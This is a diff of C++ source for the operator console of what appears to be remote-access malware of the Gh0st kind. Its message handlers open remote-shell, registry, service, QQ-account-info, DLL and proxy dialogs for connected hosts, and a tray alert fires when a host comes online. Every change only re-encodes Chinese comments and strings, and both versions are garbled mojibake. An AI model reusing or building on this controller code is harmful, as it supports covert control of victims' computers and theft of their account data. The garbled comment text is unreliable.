-	case TOKEN_SSLIST: // æœåŠ¡ç®¡ç†
+	case TOKEN_SSLIST: // ·şÎñ¹ÜÀí
 		g_pConnectView->PostMessage(WM_OPENPSERLISTDIALOG, 0, (LPARAM)pContext);
 		break;
-	case TOKEN_SHELL_START://è¿œç¨‹ç»ˆç«¯
+	case TOKEN_SHELL_START://Ô¶³ÌÖÕ¶Ë
 		g_pConnectView->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
 		break;
 	case TOKEN_SYSINFOLIST:
@@ -841,37 +841,37 @@ void CMainFrame::ProcessReceiveComplete(ClientContext *pContext)
 	case TOKEN_QQINFO:
 		g_pConnectView->PostMessage(WM_OPENQQINFODIALOG, 0, (LPARAM)pContext);
 		break;
-	case TOKEN_REGEDIT:		//æ³¨å†Œè¡¨ç®¡ç†    
+	case TOKEN_REGEDIT:		//×¢²á±í¹ÜÀí    
 		g_pConnectView->PostMessage(WM_OPENREGEDITDIALOG, 0, (LPARAM)pContext);
 		break;
 	case TOKEN_DLLMAIN:
 		g_pConnectView->PostMessage(WM_OPENDLLDLG, 0, (LPARAM)pContext);
 		break;
-	case TOKEN_INFO_YES: //ä¸»æœºç­›é€‰
+	case TOKEN_INFO_YES: //Ö÷»úÉ¸Ñ¡
 		g_pConnectView->PostMessage(WM_MODIFYLIST, 0, (LPARAM)pContext);
 		break;
-	case TOKEN_INFO_NO:  //ä¸»æœºç­›é€‰
+	case TOKEN_INFO_NO:  //Ö÷»úÉ¸Ñ¡
 		g_pConnectView->PostMessage(WM_NOMODIFYLIST, 0, (LPARAM)pContext);
 		break;
 	case TOKEN_PROXY_START:
 		g_pConnectView->PostMessage(WM_OPENPROXYMAPDIALOG, 0, (LPARAM)pContext);
 		break;	
-		// å‘½ä»¤åœæ­¢å½“å‰æ“ä½œ
+		// ÃüÁîÍ£Ö¹µ±Ç°²Ù×÷
 	default:
 		closesocket(pContext->m_Socket);
 		break;
 	}	
 }
 
-// éœ€è¦æ˜¾ç¤ºè¿›åº¦çš„çª—å£
+// ĞèÒªÏÔÊ¾½ø¶ÈµÄ´°¿Ú
 void CMainFrame::ProcessReceive(ClientContext *pContext)
 {
 	if (pContext == NULL)
 		return;
-	// å¦‚æœç®¡ç†å¯¹è¯æ¡†æ‰“å¼€ï¼Œäº¤ç»™ç›¸åº”çš„å¯¹è¯æ¡†å¤„ç†
+	// Èç¹û¹ÜÀí¶Ô»°¿ò´ò¿ª£¬½»¸øÏàÓ¦µÄ¶Ô»°¿ò´¦Àí
 	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];
 	
-	// äº¤ç»™çª—å£å¤„ç†
+	// ½»¸ø´°¿Ú´¦Àí
 	if (pContext->m_Dialog[0] > 0)
 	{
 		switch (pContext->m_Dialog[0])
@@ -895,18 +895,18 @@ void CMainFrame::ProcessReceive(ClientContext *pContext)
 void CMainFrame::OnClose() 
 {
 	// TODO: Add your message handler code here and/or call default
-// 	if (MessageBox(_T("ç¡®è®¤é€€å‡ºç¨‹åºå—?"), _T("æç¤º"), MB_YESNO | MB_ICONQUESTION) == IDNO)
+// 	if (MessageBox(_T("È·ÈÏÍË³ö³ÌĞòÂğ?"), _T("ÌáÊ¾"), MB_YESNO | MB_ICONQUESTION) == IDNO)
 // 		return;
-	if(m_bSetRestart == NULL)  //æ­£å¸¸å…³é—­
+	if(m_bSetRestart == NULL)  //Õı³£¹Ø±Õ
 	{
-		int iResult = MessageBox("æ‚¨ç¡®è®¤è¦é€€å‡º", " æç¤º", MB_ICONQUESTION|MB_YESNO);
+		int iResult = MessageBox("ÄúÈ·ÈÏÒªÍË³ö", " ÌáÊ¾", MB_ICONQUESTION|MB_YESNO);
 		if(iResult != IDYES)
 			return ;
 	}
-	else   //è½¯ä»¶é‡å¯
+	else   //Èí¼şÖØÆô
 	{
 		char pBuf[MAX_PATH];
-		//è·å–åº”ç”¨ç¨‹åºå®Œå…¨è·¯å¾„
+		//»ñÈ¡Ó¦ÓÃ³ÌĞòÍêÈ«Â·¾¶
 		GetModuleFileName(NULL,pBuf,MAX_PATH);
 		
 		STARTUPINFO startupinfo;
@@ -956,7 +956,7 @@ void CMainFrame::ShowConnectionsNumber()
 		pView = DYNAMIC_DOWNCAST(CClientView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(i)->GetHandle()));
 		a += pView->m_pListCtrl->GetItemCount();
 	}
-	str.Format(_T("åˆè®¡: %då°"), a);
+	str.Format(_T("ºÏ¼Æ: %dÌ¨"), a);
  	m_wndStatusBar.SetPaneText(2, str);
 	
 	UpdateData();
@@ -987,7 +987,7 @@ void CMainFrame::OnExit()
 void CMainFrame::ShowToolTips(LPCTSTR lpszText)
 {
 #ifdef NDEBUG
-	m_TrayIcon.ShowBalloonTip(lpszText, _T("æœ‰ä¸»æœºä¸Šçº¿è¯·æ³¨æ„: "), NIIF_NONE, 5);
+	m_TrayIcon.ShowBalloonTip(lpszText, _T("ÓĞÖ÷»úÉÏÏßÇë×¢Òâ: "), NIIF_NONE, 5);
 #endif // NDEBUG
 }
 
@@ -1022,7 +1022,7 @@ void CMainFrame::SetTheme(int iTheme)
 
 CXTPDockingPane* CMainFrame::CreatePane(int x, int y, CRuntimeClass* pNewViewClass, CString strFormat, XTPDockingPaneDirection direction, CXTPDockingPane* pNeighbour)
 {
-	//åšä¸ªæ ‡è®°
+	//×ö¸ö±ê¼Ç
 	int nID = ++m_nCount;
 	
 	CXTPDockingPane* pwndPane = m_paneManager.CreatePane(nID, CRect(0, 0,x, y), direction, pNeighbour);
@@ -1179,7 +1179,7 @@ void CMainFrame::OnLock()
 		memset(&pi, 0, sizeof(pi));
 		if (!CreateProcess(strFile, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
 			return;
-		// ç­‰å¾…æ–°è¿›ç¨‹åˆå§‹åŒ–å®Œæ¯•
+		// µÈ´ıĞÂ½ø³Ì³õÊ¼»¯Íê±Ï
 		WaitForInputIdle(pi.hProcess, INFINITE);
 		pwi.dwProcessId = pi.dwProcessId;
 		pwi.hWnd = NULL;
@@ -1190,13 +1190,13 @@ void CMainFrame::OnLock()
 		pwi.dwProcessId = 0;
 		EnumWindows(EnumWindowsProc, (LPARAM)&pwi);
 		::ShowWindow(::FindWindow("Progman", NULL), SW_HIDE);
-		::ShowWindow(::FindWindow("Button", "å¼€å§‹"), SW_HIDE);
+		::ShowWindow(::FindWindow("Button", "¿ªÊ¼"), SW_HIDE);
 		::ShowWindow(::FindWindow("Shell_TrayWnd", NULL), SW_HIDE);
 		WaitForSingleObject(pi.hProcess, INFINITE);
 		CloseHandle(pi.hThread);
 		CloseHandle(pi.hProcess);
 		::ShowWindow (::FindWindow("Shell_TrayWnd", NULL), SW_SHOW);
-		::ShowWindow (::FindWindow("Button", "å¼€å§‹"), SW_SHOW);
+		::ShowWindow (::FindWindow("Button", "¿ªÊ¼"), SW_SHOW);
 		::ShowWindow(::FindWindow("Progman", NULL), SW_SHOW);
 		AfxGetApp()->m_pMainWnd->ShowWindow(SW_SHOW);
 	}
